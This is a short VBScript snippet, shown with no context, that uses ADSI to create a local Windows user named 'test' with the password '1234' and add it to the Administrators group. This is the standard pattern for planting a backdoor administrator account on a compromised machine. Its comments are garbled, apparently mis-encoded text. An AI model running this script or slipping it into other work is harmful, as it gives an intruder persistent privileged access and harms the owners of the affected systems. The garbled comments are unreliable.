set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os) '�õ�adsi�ӿ�,��
Set oe=GetObject(os&"/Administrators,group") '����,admin��
Set od=ob.Create("user","test") '�����û�
od.SetPassword "1234" '��������
od.SetInfo '����
Set of=GetObject(os&"/test",user) '�õ��û�
oe.add os&"/test" 



